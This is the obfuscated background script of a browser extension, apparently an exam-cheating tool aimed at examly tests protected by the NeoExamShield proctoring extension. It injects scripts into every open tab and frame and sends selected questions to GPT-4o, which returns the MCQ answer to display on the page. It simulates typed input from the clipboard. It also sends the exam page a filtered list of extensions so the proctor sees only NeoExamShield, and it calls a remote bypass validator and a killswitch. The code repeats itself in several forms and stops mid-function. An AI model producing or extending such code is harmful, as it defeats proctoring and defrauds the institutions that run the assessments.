//----------------------------------------------------------------------------
function _0x4c14() {
  var e = [
    "54654bEkjXD",
    "44427950HEBeUd",
    "qvHCi",
    "12yLMwgM",
    "77793DPNbyc",
    "21pPgVlx",
    "10743408KMVvhD",
    "get",
    "66608zYntxo",
    "credential",
    "storage",
    "PFDSR",
    "4275954kEyIdE",
    "3729838ZePQuZ",
    "425DMZDRP",
    "local",
    "11bwksfd",
  ];
  return (_0x4c14 = function () {
    return e;
  })();
}
if (
  ((function (e, t) {
    for (var n = _0x58e2, r = _0x4c14(); ; )
      try {
        if (
          696073 ===
          (-parseInt(n(277)) / 1) * (parseInt(n(263)) / 2) +
            (parseInt(n(276)) / 3) * (parseInt(n(275)) / 4) +
            (parseInt(n(269)) / 5) * (-parseInt(n(272)) / 6) +
            -parseInt(n(268)) / 7 +
            -parseInt(n(278)) / 8 +
            -parseInt(n(267)) / 9 +
            (parseInt(n(273)) / 10) * (parseInt(n(271)) / 11)
        )
          break;
        r.push(r.shift());
      } catch (e) {
        r.push(r.shift());
      }
  })(),
  void 0 === browser)
)
  var browser = chrome;
function _0x58e2(e, t) {
  var n = _0x4c14();
  return (_0x58e2 = function (e, t) {
    return n[(e -= 263)];
  })(e, t);
}
function getCredentials() {
  var e = _0x58e2,
    t = {
      qvHCi: function (e, t) {
        return e(t);
      },
      PFDSR: e(264) + "s",
    };
  return new Promise((n) => {
    var r = e;
    browser[r(265)][r(270)][r(279)]([t[r(266)]], (e) => {
      var o = r;
      t[o(274)](n, e[o(264) + "s"]);
    });
  });
}
function _0x135c() {
  var e = [
    "elf",
    "NeoExamShi",
    "llURL",
    "then",
    "525TnTVpp",
    "7FSEZWT",
    "117808Ndqnmk",
    "48AnyWUb",
    "3142968ljBzcj",
    "gGxIS",
    "uven.verce",
    "redirect",
    "ion instal",
    "error",
    "https://th",
    "addListene",
    "eld extens",
    "uUERv",
    "onse.",
    "onInstalle",
    "364076ukXbeC",
    "runtime",
    "message",
    "16191GFMROQ",
    "aded.",
    "QomaL",
    "killswitch",
    "o API resp",
    "status",
    "aded due t",
    "management",
    "6186CRghWC",
    "uninstallS",
    "1288936ZObSSm",
    "l.app/api/",
    "json",
    "mnjei",
    "king API:",
    "ottathukid",
    "271325pNlBpX",
    "Error chec",
    "log",
    "ion not lo",
    "1800efeBpC",
    "catch",
    "AXnCg",
    "setUninsta",
    "led and lo",
    "IZJNz",
    "39koDTgQ",
  ];
  return (_0x135c = function () {
    return e;
  })();
}
var _0x21aa0a = _0x3422;
function _0x3422(e, t) {
  var n = _0x135c();
  return (_0x3422 = function (e, t) {
    return n[(e -= 154)];
  })(e, t);
}
(function (e, t) {
  for (var n = _0x3422, r = _0x135c(); ; )
    try {
      if (
        220911 ===
        -parseInt(n(196)) / 1 +
          -parseInt(n(177)) / 2 +
          (-parseInt(n(156)) / 3) * (-parseInt(n(163)) / 4) +
          (-parseInt(n(161)) / 5) * (parseInt(n(188)) / 6) +
          (-parseInt(n(162)) / 7) * (parseInt(n(165)) / 8) +
          (-parseInt(n(180)) / 9) * (-parseInt(n(200)) / 10) +
          (-parseInt(n(190)) / 11) * (-parseInt(n(164)) / 12)
      )
        break;
      r.push(r.shift());
    } catch (e) {
      r.push(r.shift());
    }
})(),
  browser[_0x21aa0a(178)][_0x21aa0a(176) + "d"][_0x21aa0a(172) + "r"](() => {
    var e = _0x21aa0a,
      t = {
        QomaL: function (e, t) {
          return e === t;
        },
        AXnCg: e(158) + e(173) + e(169) + e(154) + e(181),
        gGxIS: e(158) + e(173) + e(199) + e(186) + e(184) + e(175),
        mnjei: e(197) + e(194),
        IZJNz: function (e, t) {
          return e(t);
        },
        uUERv: e(171) + e(195) + e(167) + e(191) + e(183),
      };
    t[e(155)](fetch, t[e(174)])
      [e(160)]((t) => t[e(192)]())
      [e(160)]((n) => {
        var r = e;
        t[r(182)](!0, n[r(185)])
          ? (console[r(198)](t[r(202)]), console[r(198)](n[r(179)]))
          : (console[r(198)](t[r(166)]),
            browser[r(178)][r(203) + r(159)](n[r(168)]),
            browser[r(187)][r(189) + r(157)]());
      })
      [e(201)]((n) => {
        var r = e;
        console[r(170)](t[r(193)], n);
      });
  });

function _0x549d(e, t) {
  const n = _0x41be();
  return (_0x549d = function (e, t) {
    return n[(e -= 122)];
  })(e, t);
}
const _0x12913c = _0x549d;
function _0x41be() {
  const e = [
    "Blocker Re",
    "url",
    "t/isolated",
    "mTmFj",
    "document_s",
    "registerCo",
    " Failed",
    "scripting",
    "7EgtMVg",
    "message re",
    "GCXGQ",
    "ContentScr",
    "t/main.js",
    "isolated",
    "124PjlkBo",
    "tabId",
    "gistration",
    "2684168USwkRc",
    "KUXSG",
    "main",
    "ipts",
    "1373055YdiPmU",
    "onUpdated",
    "actions",
    "zQSdJ",
    "tabs",
    "VLkhO",
    "10aBTPym",
    "ZfuKy",
    "tart",
    "setTitle",
    "TeHDM",
    "setBadgeTe",
    "uwGjY",
    "addListene",
    "runtime",
    "*://*/*",
    "13721SkpdMq",
    "ceived",
    " Failed: ",
    "onActivate",
    "get",
    "TBhKz",
    "cyKhO",
    "ntentScrip",
    "JLSMC",
    "length",
    ".js",
    "unregister",
    "key",
    "KWadb",
    "UNQcV",
    "102NtqiBJ",
    "ISOLATED",
    "PnkFZ",
    "log",
    "data/injec",
    "kyXSL",
    "ysIiN",
    "openNewTab",
    "pageReload",
    "CgeUO",
    "error",
    "YegdA",
    "message",
    "13261281ChBygR",
    "fNRvu",
    "query",
    "inUAw",
    "hPfmv",
    "busy",
    "windowFocu",
    "3072078jLRyns",
    "171015nLLEwk",
    "onMessage",
    "MAIN",
    "compvare",
    "ETeOn",
    "status",
    "4154553xGSmoY",
    "sTfXJ",
    "action",
  ];
  return (_0x41be = function () {
    return e;
  })();
}
(function (e, t) {
  const n = _0x549d,
    r = _0x41be();
  for (;;)
    try {
      if (
        714627 ===
        (-parseInt(n(130)) / 1) * (parseInt(n(145)) / 2) +
          parseInt(n(196)) / 3 +
          (parseInt(n(189)) / 4) * (parseInt(n(166)) / 5) +
          -parseInt(n(165)) / 6 +
          (parseInt(n(183)) / 7) * (-parseInt(n(192)) / 8) +
          (-parseInt(n(172)) / 9) * (parseInt(n(202)) / 10) +
          parseInt(n(158)) / 11
      )
        break;
      r.push(r.shift());
    } catch (e) {
      r.push(r.shift());
    }
})(),
  browser[_0x12913c(200)][_0x12913c(133) + "d"][_0x12913c(127) + "r"]((e) => {
    const t = _0x12913c;
    browser[t(200)][t(134)](e[t(190)], (e) => {
      tabDetails = e;
    });
  }),
  browser[_0x12913c(200)][_0x12913c(197)][_0x12913c(127) + "r"]((e, t, n) => {
    const r = _0x12913c,
      o = {
        ZfuKy: function (e, t) {
          return e === t;
        },
        hPfmv: r(169),
        inUAw: function (e) {
          return e();
        },
      };
    o[r(203)](o[r(162)], t[r(171)]) && ((tabDetails = n), o[r(161)](handleUrlChange));
  }),
  browser[_0x12913c(128)][_0x12913c(167)][_0x12913c(127) + "r"]((e, t, n) => {
    const r = _0x12913c,
      o = {
        cyKhO: r(184) + r(131),
        UNQcV: function (e, t) {
          return e === t;
        },
        PnkFZ: r(153) + "ed",
        ysIiN: r(164) + "s",
        JLSMC: function (e) {
          return e();
        },
        KWadb: r(152),
        KUXSG: function (e, t) {
          return e(t);
        },
      };
    console[r(148)](o[r(136)], e),
      (currentKey = e[r(142)]),
      o[r(144)](o[r(147)], e[r(174)]) || o[r(144)](o[r(151)], e[r(174)])
        ? o[r(138)](handleUrlChange)
        : o[r(144)](o[r(143)], e[r(174)]) && o[r(193)](openNewMinimizedWindowWithUrl, e[r(176)]);
  });
const notify = async (e, t, n = "E") => {
    const r = _0x12913c;
    (e = e || (await browser[r(200)][r(160)]({ active: !0, lastFocusedWindow: !0 }))[0].id),
      browser[r(174)][r(125) + "xt"]({ tabId: e, text: n }),
      browser[r(174)][r(123)]({ tabId: e, title: t });
  },
  activate = () => {
    const e = _0x12913c,
      t = {
        YegdA: e(179) + e(122),
        sTfXJ: e(129),
        uwGjY: e(194),
        mTmFj: e(149) + e(187),
        zQSdJ: e(168),
        TBhKz: e(188),
        fNRvu: e(149) + e(177) + e(140),
        ETeOn: e(146),
        VLkhO: function (e, t, n) {
          return e(t, n);
        },
        GCXGQ: function (e, t) {
          return e + t;
        },
        CgeUO: e(175) + e(191) + e(132),
        TeHDM: e(175) + e(191) + e(181),
        kyXSL: function (e) {
          return e();
        },
      };
    if (!activate[e(163)]) {
      activate[e(163)] = !0;
      try {
        browser[e(182)][e(141) + e(186) + e(195)]();
        const n = {
          allFrames: !0,
          matchOriginAsFallback: !0,
          runAt: t[e(156)],
          matches: [t[e(173)]],
        };
        browser[e(182)][e(180) + e(137) + "ts"]([
          { ...n, id: t[e(126)], js: [t[e(178)]], world: t[e(199)] },
          { ...n, id: t[e(135)], js: [t[e(159)]], world: t[e(170)] },
        ]);
      } catch (n) {
        t[e(201)](notify, void 0, t[e(185)](t[e(154)], n[e(157)])), console[e(155)](t[e(124)], n);
      }
      for (const n of activate[e(198)]) t[e(150)](n);
      (activate[e(198)][e(139)] = 0), (activate[e(163)] = !1);
    }
  };
async function processChatMessage(e) {
  const t = await queryOpenAI(e, !1, chatContext);
  t &&
    (chatContext.push({ role: "assistant", content: t }),
    browser.tabs.query({ active: !0, currentWindow: !0 }, (e) => {
      const n = e[0];
      (n.url.startsWith("http://") || n.url.startsWith("https://")) &&
        browser.tabs.sendMessage(n.id, {
          action: "updateChatHistory",
          role: "assistant",
          content: t,
        });
    }));
}
function _0xfcfe(e, t) {
  const n = _0x5cd2();
  return (_0xfcfe = function (e, t) {
    return n[(e -= 241)];
  })(e, t);
}
function _0x5cd2() {
  const e = [
    "ld be in t",
    "n>. If you",
    "6808756pUbzYR",
    "is not an ",
    "No need an",
    "https://th",
    "applicatio",
    "ottathukid",
    "ption numb",
    "json",
    "y explanat",
    "helpful as",
    "error",
    "message",
    "sTrTJ",
    "ihati",
    "You are a ",
    "Exception ",
    "while quer",
    "gsmpn",
    "508146XjFkHf",
    "ion, Just ",
    "er and the",
    "swer optio",
    "MCQ, just ",
    "on alone. ",
    "utput shou",
    "n/json",
    "point",
    " no.>. <an",
    " question ",
    "voplF",
    "131AeAaOf",
    "isArray",
    "JwYmW",
    "stringify",
    "WChHK",
    "qsruW",
    "ext/apiEnd",
    "ying OpenA",
    "5qjyZbh",
    "key",
    "KPcnj",
    "iRhBL",
    "l.app/api/",
    " correct a",
    " : <option",
    "OpenAI res",
    "log",
    "nswer opti",
    "trim",
    "his format",
    "Error quer",
    "XRRPC",
    "ponse:",
    "Bearer ",
    "4737825gGEdmw",
    "only say `",
    "oUHTh",
    " MCQ quest",
    "uven.verce",
    "ion. The o",
    "gpt-4o",
    "\nThis is a",
    "OBvHm",
    "POST",
    "22234ZGxmWK",
    "lFsns",
    "256869IUChfq",
    "choices",
    "11682797xKrUXI",
    "give the o",
    "296ofDqtL",
    "content",
    "endpoint",
    "53189840gWqMcC",
    "oaKVz",
    "sistant.",
    "Not an MCQ",
    " think the",
    "system",
    "user",
  ];
  return (_0x5cd2 = function () {
    return e;
  })();
}
async function queryOpenAI(e, t = !1, n = []) {
  const r = _0xfcfe,
    o = {
      KPcnj: function (e) {
        return e();
      },
      oaKVz: function (e, t) {
        return e == t;
      },
      lFsns: function (e, t, n) {
        return e(t, n);
      },
      ihati: r(309) + r(311) + r(282) + r(266) + r(260) + r(250),
      JwYmW: r(287),
      WChHK: r(310) + r(249),
      qsruW:
        r(285) +
        r(281) +
        r(243) +
        r(293) +
        r(312) +
        r(244) +
        r(267) +
        r(271) +
        r(247) +
        r(308) +
        r(314) +
        r(283) +
        r(248) +
        r(304) +
        r(273) +
        r(268) +
        r(251) +
        r(245) +
        r(305) +
        r(301) +
        r(252) +
        r(307) +
        r(246) +
        r(279) +
        r(300) +
        "`.",
      oUHTh: r(302),
      gsmpn: r(320) + r(315) + r(299),
      iRhBL: r(303),
      OBvHm: r(284),
      voplF: r(269) + r(276),
      sTrTJ: r(274) + r(261) + "I:",
      XRRPC: r(321) + r(322) + r(261) + "I:",
    };
  var s = await o[r(264)](getCredentials);
  if (!s || o[r(298)](null, s)) return;
  const a = await o[r(289)](fetch, o[r(319)], {
      method: o[r(256)],
      headers: { "Content-Type": o[r(258)], Authorization: r(277) + s },
      body: JSON[r(257)]({}),
    }),
    i = await a[r(313)]();
  console[r(270)](i);
  const c = i[r(296)],
    l = i[r(263)];
  t && (e += o[r(259)]);
  const d = [
    { role: o[r(280)], content: o[r(241)] },
    ...(Array[r(255)](n) ? n : []),
    { role: o[r(265)], content: e },
  ];
  try {
    const e = await o[r(289)](fetch, c, {
      method: o[r(256)],
      headers: { Authorization: "" + l, "Content-Type": o[r(258)] },
      body: JSON[r(257)]({ model: o[r(286)], messages: d }),
    });
    if (!e.ok) {
      console[r(270)](o[r(253)], e);
      const t = await e[r(313)]();
      return console[r(316)](o[r(318)], t), null;
    }
    console[r(270)](o[r(253)], e);
    const t = await e[r(313)]();
    return (
      t[r(291)] && t[r(291)][0] && t[r(291)][0][r(317)] && t[r(291)][0][r(317)][r(295)][r(272)]()
    );
  } catch (e) {
    return console[r(270)](a), console[r(316)](o[r(275)], e), null;
  }
}
async function copyToClipboard(e) {
  var t = await getCredentials();
  t &&
    null != t &&
    browser.tabs.query({ active: !0, currentWindow: !0 }, function (t) {
      t[0] &&
        (t[0].url.startsWith("http://") || t[0].url.startsWith("https://")) &&
        browser.scripting.executeScript({
          target: { tabId: t[0].id },
          func: function (e) {
            const t = document.createElement("textarea");
            (t.textContent = e),
              document.body.appendChild(t),
              t.select(),
              document.execCommand("copy"),
              document.body.removeChild(t);
          },
          args: [e],
        });
    });
}
function showToast(e, t, n = !1) {
  browser.scripting.executeScript({
    target: { tabId: e },
    func: function (e, t) {
      const n = document.createElement("div");
      (n.textContent = e),
        (n.style.position = "fixed"),
        (n.style.bottom = "20px"),
        (n.style.right = "20px"),
        (n.style.backgroundColor = "black"),
        (n.style.color = t ? "red" : "white"),
        (n.style.padding = "10px"),
        (n.style.borderRadius = "5px"),
        (n.style.zIndex = 1e3);
      const r = document.createElement("span");
      (r.textContent = "‎ ‎ ‎ ◉"),
        (r.style.float = "right"),
        (r.style.cursor = "pointer"),
        (r.onclick = function () {
          n.remove();
        }),
        n.appendChild(r),
        document.body.appendChild(n),
        setTimeout(() => {
          n.remove();
        }, 5e3);
    },
    args: [t, n],
  });
}
function showMCQToast(e, t) {
  browser.scripting.executeScript({
    target: { tabId: e },
    func: function (e) {
      const [t, ...n] = e.split(" "),
        r = `<b>${t}</b>‎ ‎ ${n.join("‎ ")}`,
        o = document.createElement("div");
      (o.innerHTML = r),
        (o.style.position = "fixed"),
        (o.style.bottom = "10px"),
        (o.style.left = "50%"),
        (o.style.transform = "translateX(-50%)"),
        (o.style.backgroundColor = "black"),
        (o.style.color = "white"),
        (o.style.padding = "15px"),
        (o.style.borderRadius = "5px"),
        (o.style.zIndex = 1e3),
        (o.style.fontSize = "16px"),
        (o.style.textAlign = "center"),
        (o.style.maxWidth = "80%");
      const s = document.createElement("span");
      (s.innerHTML = "&times;"),
        (s.style.float = "right"),
        (s.style.cursor = "pointer"),
        (s.style.marginLeft = "10px"),
        (s.onclick = function () {
          o.remove();
        }),
        o.appendChild(s),
        document.body.appendChild(o),
        setTimeout(() => {
          o.remove();
        }, 5e3);
    },
    args: [t],
  });
}
function injectScript() {
  function e() {
    const e = "image-toast-overlay";
    if (document.getElementById(e)) return void document.getElementById(e).remove();
    const t = document.createElement("div");
    (t.id = e),
      (t.innerHTML =
        '<img src="https://i.imgur.com/qEQuh64.png" style="width: 255px; height: auto;">'),
      (t.style.cssText = "position: fixed; bottom: 20px; right: 20px; z-index: 9999;"),
      document.body.appendChild(t),
      setTimeout(() => {
        document.getElementById(e) && document.getElementById(e).remove();
      }, 5e3),
      document.addEventListener("keydown", function t(n) {
        "Escape" === n.key &&
          document.getElementById(e) &&
          (document.getElementById(e).remove(), document.removeEventListener("keydown", t));
      });
  }
  function t() {
    return window.getSelection().toString();
  }
  function n(e, t, n = !1) {
    e
      ? n
        ? showMCQToast(t, e)
        : (copyToClipboard(e), showToast(t, "Successful!"))
      : showToast(t, "Error. Try again after 30s.", !0);
  }
  console.warn("------------------------run-----------------------inject-----------------"),
    browser.tabs.query({}, function (e) {
      e.forEach(function (e) {
        (e.url.startsWith("http://") || e.url.startsWith("https://")) &&
          browser.scripting.executeScript({
            target: { tabId: e.id, allFrames: !0 },
            files: [
              "data/inject/litc.js",
              "data/inject/chatOverlay.js",
              "data/inject/isolated.js",
              "data/inject/main.js",
              "data/lib/showdown.min.js",
            ],
          });
      });
    }),
    browser.tabs.onUpdated.addListener(async function (e, t, n) {
      var r = await getCredentials();
      ((t.url && (t.url.startsWith("http://") || t.url.startsWith("https://")) && r) ||
        ("compvare" === t.status && n.url.startsWith("http://")) ||
        (n.url.startsWith("https://") && r)) &&
        browser.scripting.executeScript({
          target: { tabId: e, allFrames: !0 },
          files: [
            "data/inject/litc.js",
            "data/inject/chatOverlay.js",
            "data/inject/isolated.js",
            "data/inject/main.js",
            "data/lib/showdown.min.js",
          ],
        });
    }),
    browser.contextMenus.removeAll(() => {
      browser.contextMenus.create({
        id: "copySelectedText",
        title: "Copy",
        contexts: ["selection"],
      }),
        browser.contextMenus.create({
          id: "separator1",
          type: "separator",
          contexts: ["editable", "selection"],
        }),
        browser.contextMenus.create({
          id: "pasteClipboard",
          title: "Paste Clipboard Contents by Swapping",
          contexts: ["editable"],
        }),
        browser.contextMenus.create({
          id: "typeClipboard",
          title: "Type Clipboard",
          contexts: ["editable"],
        }),
        browser.contextMenus.create({
          id: "separator2",
          type: "separator",
          contexts: ["editable", "selection"],
        }),
        browser.contextMenus.create({
          id: "searchWithOpenAI",
          title: "Search with OpenAI",
          contexts: ["selection"],
        }),
        browser.contextMenus.create({
          id: "solveMCQ",
          title: "Solve MCQ",
          contexts: ["selection"],
        });
    }),
    browser.contextMenus.onClicked.addListener(async (e, t) => {
      (await (async function () {
        const e = await fetch("https://thottathukiduven.vercel.app/api/version"),
          t = (await e.json()).version,
          n = browser.runtime.getManifest().version;
        return !(
          parseFloat(t) > parseFloat(n) &&
          (browser.windows.create({
            url: "data/update/updatePopup.html",
            type: "popup",
            width: 100,
            height: 100,
          }),
          1)
        );
      })()) &&
        ("copySelectedText" === e.menuItemId &&
          e.selectionText &&
          browser.scripting.executeScript({
            target: { tabId: t.id },
            func: (e) => {
              const t = document.createElement("textarea");
              (t.textContent = e),
                document.body.appendChild(t),
                t.select(),
                document.execCommand("copy"),
                document.body.removeChild(t);
            },
            args: [e.selectionText],
          }),
        "typeClipboard" === e.menuItemId &&
          browser.scripting.executeScript({
            target: { tabId: t.id },
            func: async () => {
              const e = await navigator.clipboard.readText(),
                t = document.activeElement;
              for (var n of e) {
                const e = new KeyboardEvent("keydown", {
                    key: n,
                    code: "Key" + n.toUpperCase(),
                    charCode: n.charCodeAt(0),
                    keyCode: n.charCodeAt(0),
                    which: n.charCodeAt(0),
                    bubbles: !0,
                  }),
                  r = new KeyboardEvent("keypress", {
                    key: n,
                    code: "Key" + n.toUpperCase(),
                    charCode: n.charCodeAt(0),
                    keyCode: n.charCodeAt(0),
                    which: n.charCodeAt(0),
                    bubbles: !0,
                  }),
                  o = new InputEvent("input", { data: n, inputType: "insertText", bubbles: !0 });
                t.dispatchEvent(e), t.dispatchEvent(r), (t.value += n), t.dispatchEvent(o);
              }
            },
          }),
        "pasteClipboard" === e.menuItemId &&
          browser.scripting.executeScript({
            target: { tabId: t.id },
            func: async () => {
              const e = await navigator.clipboard.readText();
              (document.activeElement.value = e),
                document.activeElement.dispatchEvent(new Event("input", { bubbles: !0 }));
            },
          }),
        "searchWithOpenAI" === e.menuItemId &&
          e.selectionText &&
          n(await queryOpenAI(e.selectionText), t.id),
        "solveMCQ" === e.menuItemId &&
          e.selectionText &&
          n(await queryOpenAI(e.selectionText, !0), t.id, !0));
    }),
    browser.commands.onCommand.addListener(function (e) {
      "show-overlay" === e &&
        browser.tabs.query({ active: !0, currentWindow: !0 }, function (e) {
          var t;
          e[0] &&
            ((t = e[0].id),
            browser.scripting.executeScript({
              target: { tabId: t },
              func: function (e) {
                if (document.getElementById("openai-overlay"))
                  return void document.getElementById("openai-overlay").remove();
                const t = document.createElement("div");
                (t.innerHTML = e), document.body.appendChild(t);
                const n = document.getElementById("openai-textbox");
                n.focus(),
                  n.addEventListener("keydown", function (e) {
                    "Enter" === e.key &&
                      e.shiftKey &&
                      document.getElementById("openai-overlay").remove();
                  }),
                  document.addEventListener("keydown", function (e) {
                    "Escape" === e.key && document.getElementById("openai-overlay").remove();
                  });
              },
              args: [
                '\n<div id="openai-overlay" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.8); display: flex; align-items: center; justify-content: center; z-index: 9999;">\n    <div style="width: 40%; padding: 20px; background-color: #2c2c2c; border: 1px solid #444; border-radius: 8px;">\n        <div id="prompt-suggestions" style="margin-bottom: 10px;">\n            <span style="color: #888; cursor: pointer;" onclick="document.getElementById(\'openai-textbox\').value = \'Secret Textbox\'">Press [Esc] to exit</span>\n        </div>\n        <textarea id="openai-textbox" style="width: 100%; height: 100px; padding: 10px 10px; font-size: 16px; background-color: #2c2c2c; color: #ffffff; border: none; border-radius: 8px; resize: vertical; outline: none;"></textarea>\n    </div>\n</div>\n',
              ],
            }));
        });
    }),
    browser.commands.onCommand.addListener(async (r, o) => {
      var s = await getCredentials();
      s &&
        null != s &&
        ("custom-paste" === r &&
          browser.scripting.executeScript({
            target: { tabId: o.id },
            func: async () => {
              const e = await navigator.clipboard.readText(),
                t = document.querySelector('#chat-overlay div[contenteditable="true"]');
              if (t) {
                t.innerText += e;
                const n = new Event("input", { bubbles: !0 });
                t.dispatchEvent(n);
              }
            },
          }),
        "search-mcq" === r &&
          browser.scripting.executeScript({ target: { tabId: o.id }, function: t }, async (e) => {
            if (e[0]) {
              const t = "search-mcq" === r;
              n(await queryOpenAI(e[0].result, t), o.id, t);
            }
          }),
        "search-openai" === r &&
          browser.scripting.executeScript({ target: { tabId: o.id }, function: t }, async (e) => {
            if (e[0]) {
              const t = "search-mcq" === r;
              console.log("\n\n---------------------------search-openai", t),
                n(await queryOpenAI(e[0].result, t), o.id, t);
            }
          }),
        "custom-copy" === r &&
          browser.scripting.executeScript({
            target: { tabId: o.id },
            function: () => {
              const e = window.getSelection().toString(),
                t = document.createElement("textarea");
              (t.textContent = e),
                document.body.appendChild(t),
                t.select(),
                document.execCommand("copy"),
                document.body.removeChild(t);
            },
          }),
        "custom-paste" === r &&
          browser.scripting.executeScript({
            target: { tabId: o.id },
            func: async () => {
              const e = await navigator.clipboard.readText();
              (document.activeElement.value = e),
                document.activeElement.dispatchEvent(new Event("input", { bubbles: !0 }));
            },
          }),
        "show-help" === r &&
          browser.scripting.executeScript({ target: { tabId: o.id }, function: e }),
        "toggle-chat" === r &&
          browser.tabs.query({ active: !0, currentWindow: !0 }, (e) => {
            browser.tabs.sendMessage(e[0].id, { action: "toggleChatOverlay" });
          }));
    });
}
// let tabDetails;const domain_ip_addresses=["142.250.193.147","34.233.30.196","35.212.92.221"];let currentKey=null,reloadTabOnNextUrlChange=!0;const urlPatterns=["mycourses/details?id=","test?id=","mycdetails?c_id=","/test-compatibility"];let isReloading=!1;function fetchExtensionDetails(e){browser.management.getAll((t=>{const n=t.filter((e=>e.enabled&&"NeoExamShield"===e.name&&"extension"===e.type)),a=n.filter((e=>e.enabled&&"NeoExamShield"!==e.name&&"extension"===e.type)).length;e(n,a)}))}const fetchDomainIp=e=>new Promise((t=>{const n=new URL(e).hostname;fetch(`https://dns.google/resolve?name=${n}`).then((e=>e.json())).then((e=>{const n=e.Answer.find((e=>1===e.type))?.data||null;t(n)})).catch((()=>{t(null)}))}));async function handleUrlChange(){if(urlPatterns.some((e=>tabDetails.url.includes(e)))){let t=await(e=tabDetails.url,new Promise((t=>{const n=new URL(e).hostname;fetch(`https://dns.google/resolve?name=${n}`).then((e=>e.json())).then((e=>{const n=e.Answer.find((e=>1===e.type))?.data||null;t(n)})).catch((()=>{t(null)}))})));t&&domain_ip_addresses.includes(t)||tabDetails.url.includes("examly.net")||tabDetails.url.includes("examly.test")||tabDetails.url.includes("examly.io")?fetchExtensionDetails(((e,t)=>{let n={action:"getUrlAndExtensionData",url:tabDetails.url,enabledExtensionCount:t,extensions:e,id:tabDetails.id,currentKey:currentKey};browser.tabs.sendMessage(tabDetails.id,n,(e=>{browser.runtime.lastError&&"Could not establish connection. Receiving end does not exist."===browser.runtime.lastError.message&&browser.tabs.update(tabDetails.id,{url:tabDetails.url})}))})):console.log("Failed to fetch IP address")}var e}function openNewMinimizedWindowWithUrl(e){browser.tabs.create({url:e},(e=>{}))}function reloadMatchingTabs(){isReloading||(isReloading=!0,browser.tabs.query({},(e=>{e.forEach((e=>{urlPatterns.some((t=>e.url.includes(t)))&&browser.tabs.reload(e.id,(()=>{console.log(`Reloaded tab ${e.id} with URL: ${e.url}`)}))})),setTimeout((()=>{isReloading=!1}),1e3)})))}async function verifyFileIntegrity(){const e=await fetch("https://thotta.vercel.app/api/ext/bypass/extension-validator",{headers:{accept:"*/*","accept-language":"en-US,en;q=0.9","cache-control":"no-cache","content-type":"application/json"},method:"POST",mode:"cors"}),t=await e.json();console.log(t),t.license||(sendVerifyMessage(),isValidExtension=!0)}function sendVerifyMessage(){if(urlPatterns.some((e=>tabDetails.url.includes(e)))){let e={action:"invalid",license:!0};chrome.tabs.sendMessage(tabDetails.id,e)}}browser.tabs.onActivated.addListener((e=>{browser.tabs.get(e.tabId,(e=>{tabDetails=e}))})),browser.tabs.onUpdated.addListener(((e,t,n)=>{"complete"===t.status&&(tabDetails=n,handleUrlChange())})),browser.management.onEnabled.addListener((e=>{reloadMatchingTabs()})),browser.runtime.onMessage.addListener(((e,t,n)=>{console.log("message received",e),currentKey=e.key,"pageReloaded"===e.action||"windowFocus"===e.action?handleUrlChange():"openNewTab"===e.action&&openNewMinimizedWindowWithUrl(e.url)})),verifyFileIntegrity(),setInterval(sendVerifyMessage,5e3),setInterval(verifyFileIntegrity,3e4);
const _0x2702f7 = _0x1a9c;
(function (_0x448e4e, _0x347a28) {
  const _0x45e1ef = _0x1a9c,
    _0x32ee32 = _0x448e4e();
  while (!![]) {
    try {
      const _0x44275c =
        parseInt(_0x45e1ef(0xf1)) / 0x1 +
        parseInt(_0x45e1ef(0xcd)) / 0x2 +
        parseInt(_0x45e1ef(0xc2)) / 0x3 +
        -parseInt(_0x45e1ef(0xc1)) / 0x4 +
        -parseInt(_0x45e1ef(0xe2)) / 0x5 +
        (parseInt(_0x45e1ef(0xcf)) / 0x6) * (-parseInt(_0x45e1ef(0xbe)) / 0x7) +
        -parseInt(_0x45e1ef(0xca)) / 0x8;
      if (_0x44275c === _0x347a28) break;
      else _0x32ee32["push"](_0x32ee32["shift"]());
    } catch (_0x99b374) {
      _0x32ee32["push"](_0x32ee32["shift"]());
    }
  }
})(_0x4136, 0x38657);
let tabDetails;
const domain_ip_addresses = [_0x2702f7(0xb5), "34.233.30.196", _0x2702f7(0xc9)];
function _0x1a9c(_0x24e09c, _0x47407e) {
  const _0x413631 = _0x4136();
  return (
    (_0x1a9c = function (_0x1a9c67, _0x3010cb) {
      _0x1a9c67 = _0x1a9c67 - 0xb0;
      let _0x59f0b0 = _0x413631[_0x1a9c67];
      return _0x59f0b0;
    }),
    _0x1a9c(_0x24e09c, _0x47407e)
  );
}
let currentKey = null,
  reloadTabOnNextUrlChange = !0x0;
function _0x4136() {
  const _0x128ba8 = [
    "some",
    "no-cache",
    "includes",
    "data",
    "enabled",
    "message\x20received",
    "find",
    "Failed\x20to\x20fetch\x20IP\x20address",
    "https://thotta.vercel.app/api/ext/bypass/extension-validator",
    "test?id=",
    "log",
    "url",
    "query",
    "tabs",
    "examly.test",
    "664895pmLIpW",
    "\x20with\x20URL:\x20",
    "openNewTab",
    "length",
    "type",
    "Could\x20not\x20establish\x20connection.\x20Receiving\x20end\x20does\x20not\x20exist.",
    "update",
    "forEach",
    "onMessage",
    "/test-compatibility",
    "name",
    "complete",
    "action",
    "key",
    "Reloaded\x20tab\x20",
    "253526lLRVDM",
    "runtime",
    "catch",
    "then",
    "mycourses/details?id=",
    "filter",
    "addListener",
    "142.250.193.147",
    "mycdetails?c_id=",
    "license",
    "json",
    "getUrlAndExtensionData",
    "windowFocus",
    "https://dns.google/resolve?name=",
    "NeoExamShield",
    "create",
    "7xrzhNI",
    "extension",
    "onActivated",
    "1086668UbYSyR",
    "1147527UiinEp",
    "message",
    "examly.net",
    "sendMessage",
    "lastError",
    "*/*",
    "onUpdated",
    "35.212.92.221",
    "1673920aAJJeV",
    "management",
    "getAll",
    "438046IXAfWf",
    "POST",
    "61038uTQqYA",
    "Answer",
    "onEnabled",
    "hostname",
  ];
  _0x4136 = function () {
    return _0x128ba8;
  };
  return _0x4136();
}
const urlPatterns = [_0x2702f7(0xb2), _0x2702f7(0xdc), _0x2702f7(0xb6), _0x2702f7(0xeb)];
let isReloading = !0x1;
function fetchExtensionDetails(_0x5ead53) {
  const _0xef2b4a = _0x2702f7;
  browser["management"][_0xef2b4a(0xcc)]((_0x48c398) => {
    const _0x56a14e = _0xef2b4a,
      _0x3d7095 = _0x48c398["filter"](
        (_0x497c73) =>
          _0x497c73[_0x56a14e(0xd7)] &&
          _0x56a14e(0xbc) === _0x497c73[_0x56a14e(0xec)] &&
          _0x56a14e(0xbf) === _0x497c73[_0x56a14e(0xe6)]
      ),
      _0x1ffcc3 = _0x3d7095[_0x56a14e(0xb3)](
        (_0x18f488) =>
